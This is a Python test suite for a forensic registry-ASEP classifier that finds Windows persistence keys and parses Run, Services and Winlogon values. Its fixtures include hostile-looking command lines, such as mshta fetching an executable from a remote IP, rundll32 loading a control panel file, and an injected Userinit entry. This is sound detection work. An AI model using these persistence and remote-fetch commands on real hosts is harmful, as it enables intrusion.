"""The ASEP table both registry adapters classify against — offline, deterministic.

A key that classifies as None is not merely unlabelled: both adapters DISCARD it. So every case
below used to be evidence loss, not a cosmetic gap, and the fourth adversarial review (R6-A,
2026-08-30) found all of them by running the classifier instead of reading it.

    uv run python tests/test_registry_asep.py
"""
from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from adapters import registry_asep  # noqa: E402


def _is(key: str, expected: str | None) -> None:
    got = registry_asep.classify_key(key)
    assert got == expected, f"{key!r}: expected {expected!r}, got {got!r}"


def test_offline_hive() -> None:
    """`CurrentControlSet` is a symlink created at boot; a collected SYSTEM hive has ControlSet001.

    A SYSTEM hive is the artifact you collect FOR service persistence (T1543.003), LSA packages,
    print monitors and BootExecute. Every one of them matched nothing and was dropped."""
    _is(r"ControlSet001\Services\MaliciousSvc", "Services")
    _is(r"ControlSet002\Services\MaliciousSvc", "Services")
    _is(r"ControlSet001\Control\Print\Monitors\Evil", "Print Monitor")
    _is(r"System\CurrentControlSet\Services\Foo", "Services")   # the online spelling still works
    print("PASS  an offline hive's ControlSet00N classifies")


def test_hive_relative_paths() -> None:
    """RECmd's KeyPath is relative to the hive root, with no leading `Software\\`."""
    _is(r"Microsoft\Windows\CurrentVersion\Run", "User ASEP - Run")
    _is(r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "User ASEP - Run")
    print("PASS  hive-relative and absolute spellings both classify")


def test_longest_match_wins() -> None:
    """A prefix table matched in insertion order reports the SHORTEST match. RunOnce, RunServices
    and RunServicesOnce all came back as plain "Run", and Winsock2 as "Services" — so filtering the
    Registry view for RunOnce returned nothing on a machine that had RunOnce persistence."""
    _is(r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "User ASEP - RunOnce")
    _is(r"Software\Microsoft\Windows\CurrentVersion\RunServices", "User ASEP - RunServices")
    _is(r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "User ASEP - RunServicesOnce")
    _is(r"Software\Microsoft\Windows\CurrentVersion\Run", "User ASEP - Run")
    _is(r"ControlSet001\Services\Winsock2\Parameters", "Winsock LSP")
    _is(r"ControlSet001\Control\Session Manager\KnownDLLs", "Known DLLs")
    _is(r"ControlSet001\Control\Session Manager", "Session Manager")
    print("PASS  the longest pattern wins, so RunOnce is not reported as Run")


def test_patterns_that_named_a_value() -> None:
    """Three entries named a VALUE and were tested against a KEY path, so they never fired.

    `Security Packages` and `Authentication Packages` are values of `…\\Control\\Lsa` — an SSP DLL
    added there is credential-theft persistence (T1547.005) and classified as nothing at all."""
    _is(r"ControlSet001\Control\Lsa", "LSA Packages")
    _is(r"System\CurrentControlSet\Control\Lsa", "LSA Packages")
    print("PASS  the LSA and Session Manager keys classify, not their value names")


def test_still_says_no() -> None:
    """The other half of a classifier: an ordinary key must not become a persistence record."""
    for key in (r"HKEY_LOCAL_MACHINE\SOFTWARE\Vendor\App",
                r"Software\Classes\.txt",
                r"ControlSet001\Enum\PCI",
                ""):
        _is(key, None)
    assert registry_asep.classify_key(None) is None      # type: ignore[arg-type]
    print("PASS  a non-ASEP key is still not persistence")


# ---------------------------------------------------------------------------
# program_from_value — the artifact a registry finding contributes
# ---------------------------------------------------------------------------

def _prog(category: str | None, value_name: str | None, data: str | None) -> str | None:
    return registry_asep.program_from_value(category, value_name, data)


RUN = "User ASEP - Run"


def test_run_value_is_a_command_line_not_a_path() -> None:
    """The whole point of the entry: a Run value carries quoting and arguments, and the artifact is
    the program it STARTS. Reading the raw string as a filename is what made the Run key's payload
    invisible to every bridge."""
    assert _prog(RUN, "Updater", r'"C:\Windows\Temp\svcupdate.exe" -install') == \
        r"C:\Windows\Temp\svcupdate.exe"
    assert _prog(RUN, "Updater", r"C:\Windows\Temp\svcupdate.exe -install") == \
        r"C:\Windows\Temp\svcupdate.exe"
    # A Run value with no arguments at all.
    assert _prog(RUN, "Updater", r"C:\Windows\Temp\svcupdate.exe") == \
        r"C:\Windows\Temp\svcupdate.exe"
    # regedit writes REG_SZ verbatim: a path under `C:\Program Files` has spaces and no quotes of
    # its own, and splitting it on whitespace would stop at `C:\Program`.
    assert _prog(RUN, "Updater", r"C:\Program Files\Vendor\agent.exe /silent") == \
        r"C:\Program Files\Vendor\agent.exe"
    assert _prog(RUN, "Updater", r'"C:\Program Files\Vendor\agent.exe" /silent') == \
        r"C:\Program Files\Vendor\agent.exe"


def test_the_program_is_the_shortest_run_that_is_one() -> None:
    """What the artifact must NOT be. Reading "the string ends in `.exe`" as "the string IS a path"
    made a command line whose LAST argument is an executable into the artifact — so
    `mshta.exe http://198.51.100.20/x.exe` minted a local `x.exe`, which the store then bridged to
    every other record naming an `x.exe` on the host. The shortest leading run, not the longest, is
    what stops at the program."""
    assert _prog(RUN, "Updater", r"msiexec.exe /i C:\path\installer.msi") == "msiexec.exe"
    assert _prog(RUN, "Updater", r"mshta.exe http://198.51.100.20/x.exe") == "mshta.exe"
    assert _prog(RUN, "Updater", r"rundll32.exe C:\Temp\evil.cpl,Entry") == "rundll32.exe"
    # A URL is not a file on this host.
    assert _prog(RUN, "Updater", r"http://198.51.100.20/x.exe") is None
    # A DLL is a component, not a program a Run value launches.
    assert _prog(RUN, "Updater", r"C:\Temp\payload.dll") is None
    # The NT native prefix names the same file as the Win32 spelling.
    assert _prog(RUN, "Updater", r"\??\C:\Windows\Temp\svcupdate.exe") == \
        r"C:\Windows\Temp\svcupdate.exe"
    # Scripts and installers are persistence too, not only `.exe`.
    assert _prog(RUN, "Updater", r"C:\Temp\run.ps1") == r"C:\Temp\run.ps1"
    assert _prog(RUN, "Updater", r'wscript.exe "C:\Temp\x.vbs"') == "wscript.exe"


def test_a_value_that_names_no_program_is_not_guessed() -> None:
    """A fabricated `file.path` is worse than a missing one: it bridges records that share nothing.
    Every case here must return None rather than a plausible-looking token."""
    for data in (None, "", "   ", "00000002", "1", r'"unbalanced', "notepad",
                 r"C:\Windows\Temp", r"http://198.51.100.20/payload", r"%TEMP%"):
        assert _prog(RUN, "Updater", data) is None, data
    # A non-string value (a DWORD read straight off a hive) has no path in it.
    assert _prog(RUN, "Updater", 2) is None      # type: ignore[arg-type]
    # Not a persistence key at all.
    assert _prog(None, "Updater", r"C:\Temp\x.exe") is None
    assert _prog("Session Manager", "BootExecute", r"C:\Temp\x.exe") is None


def test_only_the_value_that_holds_the_program_counts() -> None:
    """Which value of which key holds an executable is registry knowledge, not a rule about
    strings — `ImagePath` does, `Start` does not, and a Services key with a program-looking value
    under another name must not mint an artifact."""
    assert _prog("Services", "ImagePath", r"C:\Temp\svc.exe -k net") == r"C:\Temp\svc.exe"
    assert _prog("Services", "Start", r"C:\Temp\svc.exe") is None
    assert _prog("IFEO Debugger", "Debugger", r"C:\Temp\dbg.exe") == r"C:\Temp\dbg.exe"
    assert _prog("IFEO Debugger", "FilterFullPath", r"C:\Temp\dbg.exe") is None
    assert _prog("Active Setup", "StubPath", r"C:\Temp\setup.exe") == r"C:\Temp\setup.exe"
    assert _prog("Active Setup", "Version", r"1,0") is None


def test_winlogon_userinit_is_a_list() -> None:
    """`Userinit` is a comma-separated list, and the platform's own program comes FIRST — an injected
    one is APPENDED. Returning the first entry returned the benign binary and dropped the payload;
    and it was not filtered downstream either, because `userinit.exe` was not in the generic set, so
    it would also have bridged two unrelated hosts through a file they both run. The last program is
    the one that differs from the default."""
    from analytics import normalize

    assert _prog("Winlogon", "Userinit", r"C:\Windows\system32\userinit.exe,") == \
        r"C:\Windows\system32\userinit.exe"
    assert _prog("Winlogon", "Userinit",
                 r"C:\Windows\system32\userinit.exe,C:\Temp\evil.exe") == r"C:\Temp\evil.exe"
    assert _prog("Winlogon", "Shell", r"explorer.exe,C:\Temp\evil.exe") == r"C:\Temp\evil.exe"
    assert _prog("Winlogon", "Shell", "explorer.exe") == "explorer.exe"
    # The default a tampered Userinit keeps first is ubiquitous, and the generic set is what says so.
    assert normalize.is_generic_file(normalize.canon_file(r"C:\Windows\system32\userinit.exe"))
    # `AppInit_DLLs` sits under a Winlogon-adjacent key but is a DLL list, not a launched program.
    assert _prog("AppInit/Windows", "AppInit_DLLs", r"C:\Temp\evil.dll") is None


def test_component_lists_are_not_programs() -> None:
    """LSA packages and KnownDLLs name DLL COMPONENTS. Minting file entities from them would
    bridge unrelated hosts through a shared system DLL — the exclusion is the design, not an
    omission."""
    for category, value_name in (("LSA Packages", "Security Packages"),
                                 ("Known DLLs", "winsrv.dll"),
                                 ("Print Monitor", "Driver")):
        assert _prog(category, value_name, r"C:\Windows\system32\winsrv.dll") is None, category


def test_runservices_does_not_fall_through_to_the_services_rule() -> None:
    """`RunServices` contains the substring `Services`, so a Services test evaluated first would
    have claimed it and then rejected the value for not being named `ImagePath`."""
    assert _prog("User ASEP - RunServices", "Update", r"C:\Temp\x.exe") == r"C:\Temp\x.exe"
    assert _prog("User ASEP - RunServicesOnce", "Update", r"C:\Temp\x.exe") == r"C:\Temp\x.exe"
    assert _prog("Policy ASEP - Run", "Update", r"C:\Temp\x.exe") == r"C:\Temp\x.exe"


def run() -> int:
    test_offline_hive()
    test_hive_relative_paths()
    test_longest_match_wins()
    test_patterns_that_named_a_value()
    test_still_says_no()
    test_run_value_is_a_command_line_not_a_path()
    test_the_program_is_the_shortest_run_that_is_one()
    test_a_value_that_names_no_program_is_not_guessed()
    test_only_the_value_that_holds_the_program_counts()
    test_winlogon_userinit_is_a_list()
    test_component_lists_are_not_programs()
    test_runservices_does_not_fall_through_to_the_services_rule()
    print("PASS  registry asep: classification + the ASEP value → program parse (quoting, args, "
          "NT prefix, refusal to guess)")
    return 0


if __name__ == "__main__":
    raise SystemExit(run())
